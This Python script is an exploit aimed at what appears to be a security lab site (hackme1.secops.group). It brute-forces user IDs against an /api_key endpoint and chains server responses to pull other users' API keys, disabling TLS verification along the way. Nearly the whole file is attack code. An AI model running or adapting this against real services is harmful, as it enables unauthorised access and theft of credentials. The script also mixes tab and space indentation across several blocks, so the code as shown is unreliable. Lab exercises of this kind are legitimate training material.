#!/usr/bin/env python3

import argparse
import base64
import json
import re
import sys
import time
from typing import Optional, Tuple
from urllib.parse import unquote_plus

import requests


def decode_api_key_from_message(message_value: str) -> Optional[str]:
	"""Decode the API key from the server's MESSAGE field.

	The observed encoding is: URL-encoding -> base64 -> base64 -> plaintext key.
	Return the decoded key as a string, or None if decoding fails or does not look like a key.
	"""
	try:
		# 1) URL-decode (restores '+' and any %XX)
		stage1 = unquote_plus(message_value)
		# 2) First base64 decode; might already be bytes-like base64 string
		stage2_bytes = base64.b64decode(stage1)
		# 3) Second base64 decode to reach plaintext
		stage3_bytes = base64.b64decode(stage2_bytes)
		key = stage3_bytes.decode(errors="ignore").strip()
		# Basic sanity: looks like typical API key charset
		if len(key) >= 8 and re.fullmatch(r"[A-Za-z0-9_\-+/=]{8,}", key):
			return key
		return None
	except Exception:
		return None


def send_api_key_request(session: requests.Session, base_url: str, enc_id: str, user_id: int, timeout: int = 15) -> Tuple[Optional[dict], Optional[str]]:
	"""Send the vulnerable request. Returns (json_dict, raw_text)"""
	url = base_url.rstrip('/') + '/api_key'
	data = {
		'enc_id': enc_id,
		'new_user_id': str(user_id),
	}
	headers = {
		'Accept': '*/*',
		'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
		'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) Kevin/Unbreakable',
	}
	resp = session.post(url, data=data, headers=headers, timeout=timeout, verify=False)
	text = resp.text
	try:
		js = resp.json()
	except Exception:
		js = None
	return js, text


def brute_force(base_url: str, cookie: str, seed_enc: str, start_id: int, end_id: int, delay: float) -> Optional[Tuple[int, str]]:
    """Brute-force user ids. For each id:
    1) Send request with seed_enc
    2) Take MESSAGE from response
    3) Resend for same id with enc_id = MESSAGE
    4) Read API key directly from RESULT (already plaintext)
    Stop when key starts with 'ff0'. Return (user_id, key) or None.
    """
	s = requests.Session()
	if cookie:
		# Allow raw header cookie string like "PHPSESSID=...; other=..."
		s.headers.update({'Cookie': cookie})

	for uid in range(start_id, end_id + 1):
		# Step 1: initial request
		js1, raw1 = send_api_key_request(s, base_url, seed_enc, uid)
		if not js1 or 'MESSAGE' not in js1:
			# Proceed anyway; short sleep to be polite
			time.sleep(delay)
			continue

		message1 = js1.get('MESSAGE', '')

        # Step 2: chain enc_id = message1 and send again
        js2, raw2 = send_api_key_request(s, base_url, message1, uid)
        if js2 and 'RESULT' in js2:
            candidate_key = str(js2['RESULT']).strip()
            if candidate_key.startswith('ff0'):
                return uid, candidate_key

        # Some targets may already return the key in the first RESULT
        if 'RESULT' in js1:
            candidate_key_alt = str(js1['RESULT']).strip()
            if candidate_key_alt.startswith('ff0'):
                return uid, candidate_key_alt

		time.sleep(delay)

	return None


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(description='Bruteforce new_user_id and chain enc_id -> MESSAGE; read API key from RESULT (looking for ff0 prefix).')
	p.add_argument('--base-url', default='https://hackme1.secops.group', help='Base URL, e.g., https://hackme1.secops.group')
	p.add_argument('--cookie', required=True, help='Cookie header value, e.g., "PHPSESSID=..."')
	p.add_argument('--seed-enc', required=True, help='Initial enc_id value to start the chain')
	p.add_argument('--start-id', type=int, default=1, help='Starting user id (inclusive)')
	p.add_argument('--end-id', type=int, default=500, help='Ending user id (inclusive)')
	p.add_argument('--delay', type=float, default=0.25, help='Delay between attempts (seconds)')
	return p.parse_args()


def main() -> None:
	args = parse_args()
	requests.packages.urllib3.disable_warnings()  # ignore TLS warnings for labs

	result = brute_force(
		base_url=args.base_url,
		cookie=args.cookie,
		seed_enc=args.seed_enc,
		start_id=args.start_id,
		end_id=args.end_id,
		delay=args.delay,
	)

	if result is None:
		print('[-] No ff0* API key found in the given range.', file=sys.stderr)
		sys.exit(1)

	uid, key = result
	print(f'[+] Found valid API key for user_id={uid}: {key}')


if __name__ == '__main__':
	main()
